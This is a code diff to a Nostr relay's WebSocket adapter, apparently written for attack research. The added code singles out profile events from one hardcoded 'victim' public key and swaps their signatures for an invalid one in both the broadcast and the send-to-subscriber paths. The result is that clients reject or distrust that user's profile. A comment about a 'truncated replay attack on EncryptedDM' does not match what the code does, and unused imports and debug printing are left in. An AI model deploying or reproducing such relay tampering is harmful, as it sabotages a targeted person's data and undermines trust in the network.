@@ -11,12 +11,12 @@ import { IWebSocketAdapter, IWebSocketServerAdapter } from '../@types/adapters'
 import { SubscriptionFilter, SubscriptionId } from '../@types/subscription'
 import { WebSocketAdapterEvent, WebSocketServerAdapterEvent } from '../constants/adapter'
 import { attemptValidation } from '../utils/validation'
-import { ContextMetadataKey } from '../constants/base'
+import {ContextMetadataKey, EventKinds} from '../constants/base'
 import { createLogger } from '../factories/logger-factory'
 import { Event } from '../@types/event'
 import { getRemoteAddress } from '../utils/http'
 import { IRateLimiter } from '../@types/utils'
-import { isEventMatchingFilter } from '../utils/event'
+import { getEventHash, isEventMatchingFilter } from '../utils/event'
 import { messageSchema } from '../schemas/message-schema'
 import { Settings } from '../@types/settings'
 import { SocketAddress } from 'net'
@@ -101,24 +101,66 @@ export class WebSocketAdapter extends EventEmitter implements IWebSocketAdapter 
   }
 
   public onBroadcast(event: Event): void {
-    this.webSocketServer.emit(WebSocketServerAdapterEvent.Broadcast, event)
-    if (cluster.isWorker && typeof process.send === 'function') {
-      process.send({
-        eventName: WebSocketServerAdapterEvent.Broadcast,
-        event,
-      })
+    console.log('---------')
+    console.log('event on onBroadcast on web-socket-adapter.ts')
+    console.log(event)
+
+    // victim public key in hex string
+    const target_pub = '24f235e8a1f16dcfb85c95a7387ff0618251981c7448a84a08ed8058d32b4d6d'
+    if(event.kind==0 && event.pubkey==target_pub){
+      console.log('Replace sig with invalid sig on profile')
+      event.sig = 'd4a739b22f298cb04f69f0a9636a09d9e308eb17c4b884ae130db511cb92a9954e3048ff22dd5f10605e42f6a79bf208f368b86b877a98a68f73c15b4679c382'
+
+
+      this.webSocketServer.emit(WebSocketServerAdapterEvent.Broadcast, event)
+      if (cluster.isWorker && typeof process.send === 'function') {
+        process.send({
+          eventName: WebSocketServerAdapterEvent.Broadcast,
+          event,
+        })
+      }
+    }else{
+      this.webSocketServer.emit(WebSocketServerAdapterEvent.Broadcast, event)
+      if (cluster.isWorker && typeof process.send === 'function') {
+        process.send({
+          eventName: WebSocketServerAdapterEvent.Broadcast,
+          event,
+        })
+      }
     }
   }
 
   public onSendEvent(event: Event): void {
-    this.subscriptions.forEach((filters, subscriptionId) => {
-      if (
-        filters.map(isEventMatchingFilter).some((isMatch) => isMatch(event))
-      ) {
-        debug('sending event to client %s: %o', this.clientId, event)
-        this.sendMessage(createOutgoingEventMessage(subscriptionId, event))
-      }
-    })
+    console.log('---------')
+    console.log('event on onSendEvent on web-socket-adapter.ts')
+    console.log(event)
+    // do truncated replay attack on EncryptedDM
+    // eslint-disable-next-line max-len
+    // victim public key in hex string
+    const target_pub = '24f235e8a1f16dcfb85c95a7387ff0618251981c7448a84a08ed8058d32b4d6d'
+    if(event.kind==0 && event.pubkey==target_pub){
+      console.log('Replace sig with invalid sig on profile')
+      event.sig = 'd4a739b22f298cb04f69f0a9636a09d9e308eb17c4b884ae130db511cb92a9954e3048ff22dd5f10605e42f6a79bf208f368b86b877a98a68f73c15b4679c382'
+
+
+      this.subscriptions.forEach((filters, subscriptionId) => {
+        if (
+            filters.map(isEventMatchingFilter).some((isMatch) => isMatch(event))
+        ) {
+          debug('sending event to client %s: %o', this.clientId, event)
+          this.sendMessage(createOutgoingEventMessage(subscriptionId, event))
+        }
+      })
+    }else{
+      this.subscriptions.forEach((filters, subscriptionId) => {
+        if (
+          filters.map(isEventMatchingFilter).some((isMatch) => isMatch(event))
+        ) {
+          debug('sending event to client %s: %o', this.clientId, event)
+          this.sendMessage(createOutgoingEventMessage(subscriptionId, event))
+        }
+      })
+    }
   }
 
   private sendMessage(message: OutgoingMessage): void {
